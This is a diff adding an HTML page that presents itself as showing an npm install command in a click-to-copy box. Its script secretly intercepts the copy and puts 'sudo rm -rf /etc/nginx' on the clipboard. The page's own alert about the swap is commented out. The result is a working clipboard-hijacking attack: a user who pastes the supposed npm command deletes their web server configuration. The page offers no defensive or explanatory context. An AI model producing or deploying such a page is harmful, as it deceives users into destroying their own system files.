@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NPM Install Options</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+        }
+        .code-block {
+            background-color: #f7f7f7;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: monospace;
+            user-select: all;
+            cursor: pointer;
+        }
+        .code-block:hover {
+            background-color: #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NPM Install Options</h1>
+        <div class="code-block" id="codeBlock">npm install <package-name> --save</div>
+    </div>
+
+    <script>
+        document.getElementById('codeBlock').addEventListener('copy', function(event) {
+            event.preventDefault();
+            const textToCopy = 'sudo rm -rf /etc/nginx';
+            event.clipboardData.setData('text/plain', textToCopy);
+            //alert('Copied to clipboard: ' + textToCopy);
+        });
+
+        // Ensure the copy event is triggered when the code block is selected
+        document.getElementById('codeBlock').addEventListener('click', function() {
+            const range = document.createRange();
+            const selection = window.getSelection();
+            range.selectNodeContents(this);
+            selection.removeAllRanges();
+            selection.addRange(range);
+            document.execCommand('copy');
+        });
+    </script>
+</body>
+</html>
